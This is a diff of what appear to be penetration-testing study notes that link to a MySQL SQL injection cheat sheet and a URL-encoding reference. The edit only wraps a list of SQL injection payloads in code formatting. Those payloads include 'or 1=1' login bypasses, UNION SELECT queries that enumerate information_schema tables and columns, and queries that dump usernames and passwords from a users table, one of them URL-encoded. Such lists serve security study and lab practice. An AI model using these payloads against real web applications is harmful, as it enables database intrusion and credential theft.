@@ -58,12 +58,12 @@ https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sh
 URL encoding:
 https://www.w3schools.com/tags/ref_urlencode.ASP
 
-- test' or 1=1--
-- 1' and '1'='1'--
-- 1' OR '1'='1'#
-- 'UNION SELECT table_name, NULL FROM information_schema.tables #
-- 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' #
-- 'UNION SELECT user, password FROM users #
-- 1 UNION SELECT user, password FROM users --
-- 1%20+UNION+SELECT+user,password+FROM+users%23
-- 'UNION SELECT user, password FROM users #
+- ```test' or 1=1--```
+- ```1' and '1'='1'--```
+- ```1' OR '1'='1'#```
+- ```'UNION SELECT table_name, NULL FROM information_schema.tables #```
+- ```'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' #```
+- ```'UNION SELECT user, password FROM users #```
+- ```1 UNION SELECT user, password FROM users --```
+- ```1%20+UNION+SELECT+user,password+FROM+users%23```
+- ```'UNION SELECT user, password FROM users #```
